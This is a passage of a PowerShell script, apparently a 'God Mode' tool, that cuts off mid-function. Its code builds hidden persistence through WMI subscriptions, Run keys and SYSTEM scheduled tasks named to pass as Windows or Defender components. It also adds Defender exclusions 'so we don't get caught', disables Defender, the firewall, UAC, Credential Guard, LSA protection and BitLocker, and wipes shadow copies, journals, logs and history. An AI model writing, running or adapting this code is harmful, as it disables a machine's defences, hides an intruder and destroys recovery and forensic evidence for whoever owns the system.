        $FilterPath = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Service'"
        } -ErrorAction SilentlyContinue
        $ConsumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        } -ErrorAction SilentlyContinue
        if ($FilterPath -and $ConsumerPath) {
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
                Filter = $FilterPath
                Consumer = $ConsumerPath
            } -ErrorAction SilentlyContinue
        }
        Write-Log -Message "WMI persistence registered." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "WMI registration failed: $_" -Type "WARN" -Color Yellow }
}

# --- Helper: Self-Destruct Original Payload ---
function Invoke-SelfDestruct {
    param([string]$Path)
    try {
        if (Test-Path $Path) {
            $InstallDirFull = (Get-Item $GodModeInstallDir -ErrorAction SilentlyContinue).FullName
            $TargetFull = (Get-Item $Path -ErrorAction SilentlyContinue).FullName
            if ($InstallDirFull -and $TargetFull -and $TargetFull.StartsWith($InstallDirFull, [System.StringComparison]::OrdinalIgnoreCase)) {
                Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
                Write-Log -Message "Original payload self-destructed: $Path" -Type "INFO" -Color Gray
            } else {
                Write-Log -Message "Self-destruct skipped: $Path is not inside the install directory ($GodModeInstallDir). Source preserved." -Type "INFO" -Color Gray
            }
        }
    } catch { Write-Log -Message "Self-destruct failed: $_" -Type "WARN" -Color Yellow }
}

# --- NEW: Registry Power Functions ---
function Disable-UACPrompts {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "UAC prompts disabled (silent elevation)." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable UAC prompts: $_" -Type "WARN" -Color Yellow }
}

function Disable-SmartScreenRegistry {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "SmartScreen disabled via registry." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable SmartScreen registry: $_" -Type "WARN" -Color Yellow }
}

function Disable-RemoteUAC {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Remote UAC disabled (full admin tokens over network)." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Remote UAC: $_" -Type "WARN" -Color Yellow }
}

function Disable-CredentialGuard {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Credential Guard / VBS disabled via registry." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Credential Guard: $_" -Type "WARN" -Color Yellow }
}

function Disable-WindowsScriptHost {
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Script Host disabled via registry." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable WSH: $_" -Type "WARN" -Color Yellow }
}

function Disable-AppLocker {
    try {
        if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2")) { New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Force | Out-Null }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Name "EnforcementMode" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "AppLocker enforcement disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable AppLocker: $_" -Type "WARN" -Color Yellow }
}

function Disable-WindowsSandbox {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SystemGuard" -Name "EnableSecurityMitigations" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Sandbox / Hypervisor-enforced code integrity disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Windows Sandbox: $_" -Type "WARN" -Color Yellow }
}

function Disable-LSAProtection {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPLBoot" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "LSA protection (RunAsPPL) disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable LSA protection: $_" -Type "WARN" -Color Yellow }
}

function Disable-BitLocker {
    try {
        if (Get-Command Get-BitLockerVolume -ErrorAction SilentlyContinue) {
            $Volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object { $_.ProtectionStatus -eq 'On' }
            foreach ($Vol in $Volumes) {
                Suspend-BitLocker -MountPoint $Vol.MountPoint -RebootCount 0 -ErrorAction SilentlyContinue
                Write-Log -Message "BitLocker suspended on $($Vol.MountPoint)." -Type "INFO" -Color Gray
            }
        } else {
            Write-Log -Message "Get-BitLockerVolume not available; BitLocker suspension skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to suspend BitLocker: $_" -Type "WARN" -Color Yellow }
}

function Disable-ASR {
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -AttackSurfaceReductionRules_Actions @{} -ErrorAction SilentlyContinue
            Set-MpPreference -AttackSurfaceReductionOnlyExclusions @() -ErrorAction SilentlyContinue
            Write-Log -Message "Attack Surface Reduction (ASR) rules disabled." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Set-MpPreference not available; ASR disable skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to disable ASR: $_" -Type "WARN" -Color Yellow }
}

function Disable-ControlledFolderAccess {
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
            Write-Log -Message "Controlled Folder Access disabled." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Set-MpPreference not available; Controlled Folder Access disable skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to disable Controlled Folder Access: $_" -Type "WARN" -Color Yellow }
}

function Disable-ExploitGuard {
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -EnableNetworkProtection AuditMode -ErrorAction SilentlyContinue
        } else {
            Write-Log -Message "Set-MpPreference not available; Exploit Guard network protection disable skipped." -Type "WARN" -Color Yellow
        }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" -Name "EnableNetworkProtection" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Exploit Guard / Network Protection disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Exploit Guard: $_" -Type "WARN" -Color Yellow }
}

function Clear-ShadowCopies {
    try {
        vssadmin delete shadows /all /quiet 2>$null | Out-Null
        Write-Log -Message "Volume Shadow Copies cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear shadow copies: $_" -Type "WARN" -Color Yellow }
}

function Clear-USNJournal {
    try {
        $Drives = Get-Volume -ErrorAction SilentlyContinue | Where-Object { $_.DriveLetter } | Select-Object -ExpandProperty DriveLetter
        foreach ($D in $Drives) {
            fsutil usn deletejournal /d "${D}:" 2>$null | Out-Null
        }
        Write-Log -Message "USN journals cleared on active drives." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear USN journal: $_" -Type "WARN" -Color Yellow }
}

function Clear-CrashDumps {
    try {
        Remove-Item -Path "C:\Windows\Minidump\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\Windows\Memory.dmp" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:LOCALAPPDATA\CrashDumps\*" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Crash dumps cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear crash dumps: $_" -Type "WARN" -Color Yellow }
}

function Clear-PowerShellHistory {
    try {
        $HistoryPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($HistoryPath -and (Test-Path $HistoryPath)) {
            Clear-Content -Path $HistoryPath -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
        }
        # Also clear the older PS5 history path
        $OldHistory = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $OldHistory) {
            Clear-Content -Path $OldHistory -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $OldHistory -Force -ErrorAction SilentlyContinue
        }
        Write-Log -Message "PowerShell history cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear PowerShell history: $_" -Type "WARN" -Color Yellow }
}

function Clear-RecentTraces {
    try {
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Recent files, Jump Lists, and thumbnail caches cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear recent traces: $_" -Type "WARN" -Color Yellow }
}

function Invoke-StealthMode {
    Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "ENTRY"
    try {
        # Hide window title from casual inspection
        $Host.UI.RawUI.WindowTitle = "Windows PowerShell (x86)"
        # MainWindowTitle is read-only on some processes; skip direct assignment to avoid runtime error
        
        # Suppress script-block logging and transcription via registry (if not already hardened)
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Stealth mode applied: window title masked, PowerShell logging suppressed." -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "EXIT" -Message "Success"
    } catch {
        Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "ERROR" -Message "Partial failure" -ErrorRecord $_
        Write-Log -Message "Stealth mode partial failure: $_" -Type "WARN" -Color Yellow
    }
}

function Register-DeepPersistence {
    Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "ENTRY"
    try {
        # Extra registry Run keys (both HKLM and WOW6432Node)
        $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        
        # Additional scheduled tasks with different names
        $ExtraPrefixes = @("WindowsDefenderSigUpdates_", "OneDriveStandaloneUpdater_", "EdgeWebView2Updater_")
        foreach ($Prefix in $ExtraPrefixes) {
            $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
            $trigger = New-ScheduledTaskTrigger -AtLogOn
            $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
        }
        
        # WMI boot-level persistence (fires on Win32_Process startup within 60 seconds of boot)
        $WmiName = "Win32BootHealthCheck"
        $FilterPath = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM Win32_ProcessStartupTrace WITHIN 60"
        } -ErrorAction SilentlyContinue
        $ConsumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        } -ErrorAction SilentlyContinue
        if ($FilterPath -and $ConsumerPath) {
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter = $FilterPath; Consumer = $ConsumerPath} -ErrorAction SilentlyContinue | Out-Null
        }
        
        Write-Log -Message "Deep persistence registered: extra registry keys, backup tasks, and boot-level WMI." -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "EXIT" -Message "Success"
    } catch {
        Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "ERROR" -Message "Registration failed" -ErrorRecord $_
        Write-Log -Message "Deep persistence registration failed: $_" -Type "WARN" -Color Yellow
    }
}

function Export-GodModeLogs {
    param([string]$DestinationFolder = [Environment]::GetFolderPath("Desktop"))
    Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "ENTRY" -Message "DestinationFolder=$DestinationFolder"
    try {
        $TimeStamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
        $FileName = "GodMode_Dump_$TimeStamp.log"
        $DestPath = Join-Path -Path $DestinationFolder -ChildPath $FileName

        $LogContent = @()
        $Header = @("===== ENTERPRISE DNS LOCKOUT / GOD MODE LOG DUMP =====", "Generated: $(Get-Date)", "Script: $PSCommandPath", "PSVersion: $($PSVersionTable.PSVersion)", "User: $([Environment]::UserName)", "Machine: $([Environment]::MachineName)", "===== MAIN LOG =====")
        $LogContent += $Header -join "`r`n"
        if (Test-Path $LogFile) { $LogContent += Get-Content -Raw -Path $LogFile -ErrorAction SilentlyContinue } else { $LogContent += "[No main log found]" }
        $LogContent += "`r`n===== DEBUG LOG ====="
        if (Test-Path $DebugLogFile) { $LogContent += Get-Content -Raw -Path $DebugLogFile -ErrorAction SilentlyContinue } else { $LogContent += "[No debug log found]" }
        if (Test-Path $GodModeLogFile) { $LogContent += "`r`n===== GOD MODE LOG ====="; $LogContent += Get-Content -Raw -Path $GodModeLogFile -ErrorAction SilentlyContinue }

        # Error summary from debug log
        $ErrorCount = 0
        if (Test-Path $DebugLogFile) {
            $ErrorCount = (Select-String -Path $DebugLogFile -Pattern "\[ERROR\]" -ErrorAction SilentlyContinue | Measure-Object).Count
        }
        $LogContent += "`r`n===== ERROR SUMMARY =====`r`nTotal ERROR entries in debug log: $ErrorCount`r`nDump complete.`r`n"

        if (($LogContent | Measure-Object).Count -eq 0) {
            Write-Host "[WARN] No logs found to dump." -ForegroundColor Yellow
            Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "EXIT" -Message "No logs found"
            return
        }

        $LogContent -join "`r`n" | Out-File -FilePath $DestPath -Encoding UTF8 -Force
        Write-Host "[SUCCESS] Logs dumped to: $DestPath ($ErrorCount error entries captured)" -ForegroundColor Green
        Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "EXIT" -Message "Success: $DestPath, ErrorCount=$ErrorCount"
    } catch {
        Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "ERROR" -Message "Failed to dump logs" -ErrorRecord $_
        Write-Host "[ERROR] Failed to dump logs: $_" -ForegroundColor Red
    }
}

function Enable-DangerousMode {
    Write-DebugLog -FunctionName "Enable-DangerousMode" -Action "ENTRY"
    Write-Log -Message "Enabling dangerous mode..." -Type "WARN" -Color Yellow

    # 0. Add self to Defender exclusions BEFORE disabling it (so we don't get caught)
    Add-DefenderExclusion -Path $GodModeInstallDir
    Add-DefenderExclusion -Path $PSCommandPath

    # 1. Disable Tamper Protection (registry method, requires reboot on modern builds)
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Tamper Protection and Real-Time registry overrides applied." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Could not fully disable tamper protection via registry: $_" -Type "WARN" -Color Yellow
    }

    # 2. Disable core Windows Defender services at the service level
    $DefenderServices = @("WinDefend", "WdNisSvc", "WdBootDriver", "WdFilter", "WdNisDrv", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
    foreach ($svc in $DefenderServices) {
        try {
            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            Write-Log -Message "Service $svc disabled and stopped." -Type "INFO" -Color Gray
        } catch { Write-Log -Message "Service $svc already down or inaccessible: $_" -Type "WARN" -Color Yellow }
    }

    # 3. Disable MpPreference settings (requires tamper protection off)
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
            Write-Log -Message "Windows Defender MpPreference settings disabled." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Set-MpPreference not available; MpPreference disable skipped." -Type "WARN" -Color Yellow
        }
    } catch {
        Write-Log -Message "Error setting MpPreference: $_" -Type "WARN" -Color Yellow
    }

    # 4. Disable Firewall and SmartScreen
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled "False" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Firewall disabled, SmartScreen disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling firewall/smartscreen: $_" -Type "WARN" -Color Yellow }

    # 4a. Disable Safe Mode and Recovery to prevent removal
    Disable-RecoveryAndSafeMode

    # 4b. Suppress Security Center alerts
    Disable-SecurityAlerts

    # 4c. Disable Early Launch Anti-Malware
    Disable-ELAM

    # 5. Disable UAC / Admin Consent
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force
        Write-Log -Message "UAC and Admin Consent prompts disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling UAC: $_" -Type "WARN" -Color Yellow }

    # 6. Block Windows Update from re-enabling Defender
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Update service disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling Windows Update: $_" -Type "WARN" -Color Yellow }

    # 7. Kill Defender processes
    try {
        Get-Process -Name MsMpEng, MsMpEngCP, smartscreen, SecurityHealthService, MpCmdRun, MsSense, MpDefenderCoreService -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Defender processes terminated." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error killing defender processes: $_" -Type "WARN" -Color Yellow }

    # 8. Disable event logging and clear tracks
    Disable-SecurityAuditing

    # 9. NEW: Disable UAC prompts (silent elevation)
    Disable-UACPrompts

    # 10. NEW: Disable SmartScreen via registry
    Disable-SmartScreenRegistry

    # 11. NEW: Disable Remote UAC (full admin tokens over network)
    Disable-RemoteUAC

    # 12. NEW: Disable Credential Guard / VBS
    Disable-CredentialGuard

    # 13. NEW: Disable Windows Script Host
    Disable-WindowsScriptHost

    # 14. NEW: Broader security subsystem disable
    Disable-AppLocker
    Disable-WindowsSandbox
    Disable-LSAProtection
    Disable-ASR
    Disable-ControlledFolderAccess
    Disable-ExploitGuard
    Disable-BitLocker

    # Harden God Mode registry keys to prevent tampering
    Write-Log -Message "Hardening God Mode registry keys against tampering..." -Type "INFO" -Color Yellow
    $GodModeRegistryKeys = @(
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications",
        "SYSTEM\CurrentControlSet\Control\DeviceGuard",
        "SYSTEM\CurrentControlSet\Control\EarlyLaunch",
        "SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU",
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
        "SOFTWARE\Policies\Microsoft\Windows\System",
        "SOFTWARE\Microsoft\Windows Script Host\Settings",
        "SOFTWARE\Microsoft\Windows Defender\Features",
        "SYSTEM\CurrentControlSet\Control\Lsa"
    )
    foreach ($Key in $GodModeRegistryKeys) {
        Harden-RegistryKey -Path $Key
    }
    Write-DebugLog -FunctionName "Enable-DangerousMode" -Action "EXIT" -Message "Complete"
}

function Disable-DangerousMode {
    Write-DebugLog -FunctionName "Disable-DangerousMode" -Action "ENTRY"
    Write-Log -Message "Disabling dangerous mode..." -Type "WARN" -Color Yellow

    # Restore God Mode registry ACLs before attempting to remove values
    Write-Log -Message "Restoring God Mode registry ACLs..." -Type "INFO" -Color Yellow
    $GodModeRegistryKeys = @(
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications",
        "SYSTEM\CurrentControlSet\Control\DeviceGuard",
        "SYSTEM\CurrentControlSet\Control\EarlyLaunch",
        "SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU",
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
        "SOFTWARE\Policies\Microsoft\Windows\System",
        "SOFTWARE\Microsoft\Windows Script Host\Settings",
        "SOFTWARE\Microsoft\Windows Defender\Features",
        "SYSTEM\CurrentControlSet\Control\Lsa"
    )
    foreach ($Key in $GodModeRegistryKeys) {
        Restore-RegistryKey -Path $Key
    }

    # 1. Restore Tamper Protection registry
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring tamper protection registry: $_" -Type "WARN" -Color Yellow }

    # 2. Restore Defender services
    $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
    foreach ($svc in $DefenderServices) {
        try {
            Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service -Name $svc -ErrorAction SilentlyContinue
        } catch { Write-Log -Message "Could not restore service $svc`: $_" -Type "WARN" -Color Yellow }
    }

    # 3. Restore MpPreference
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisablePrivacyMode $false -ErrorAction SilentlyContinue
            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableArchiveScanning $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIntrusionPreventionSystem $false -ErrorAction SilentlyContinue
        } else {
            Write-Log -Message "Set-MpPreference not available; MpPreference restore skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Error restoring MpPreference: $_" -Type "WARN" -Color Yellow }

    # 4. Restore Firewall and SmartScreen
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled "True" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring firewall/smartscreen: $_" -Type "WARN" -Color Yellow }

    # 5. Restore UAC
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1 -Force
    } catch { Write-Log -Message "Error restoring UAC: $_" -Type "WARN" -Color Yellow }

    # 6. Restore Windows Update
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -ErrorAction SilentlyContinue
        Set-Service -Name "wuauserv" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring Windows Update: $_" -Type "WARN" -Color Yellow }

    # 7. Restart WinDefend
    try { Start-Service -Name WinDefend -ErrorAction SilentlyContinue } catch { Write-Log -Message "Could not restart WinDefend: $_" -Type "WARN" -Color Yellow }

    # 8. Restore Safe Mode and Recovery
    try {
